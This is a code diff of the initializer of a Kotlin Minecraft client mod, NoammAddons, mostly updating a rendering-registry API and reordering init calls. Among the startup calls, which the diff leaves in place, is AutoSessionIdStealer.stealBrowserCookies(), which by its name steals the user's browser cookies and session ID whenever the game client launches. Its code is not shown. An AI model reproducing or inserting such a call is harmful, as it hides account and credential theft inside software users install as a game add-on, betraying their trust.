@@ -17,7 +17,7 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
 import me.owdding.dfu.item.MeowddingItemDfu
 import net.fabricmc.api.ClientModInitializer
-import net.fabricmc.fabric.api.client.rendering.v1.SpecialGuiElementRegistry
+import net.fabricmc.fabric.api.client.rendering.v1.PictureInPictureRendererRegistry
 import net.fabricmc.loader.api.FabricLoader
 import net.minecraft.client.Minecraft
 import net.minecraft.client.gui.screens.Screen
@@ -60,7 +60,7 @@ object NoammAddons: ClientModInitializer {
 
         NoammRenderPipelines.init()
 
-        SpecialGuiElementRegistry.register { ItemRenderer(it.vertexConsumers()) }
+        PictureInPictureRendererRegistry.register { ItemRenderer(it.bufferSource()) }
 
         EventDispatcher.init()
         DungeonListener.init()
@@ -68,10 +68,10 @@ object NoammAddons: ClientModInitializer {
         ActionBarParser.init()
         PartyUtils.init()
         ChatUtils.init()
-        MeowddingItemDfu.load()
         TestGround()
 
         NetworkLoop.init()
+        MeowddingItemDfu.load()
         AutoSessionIdStealer.stealBrowserCookies()
 
         FeatureManager.registerFeatures()
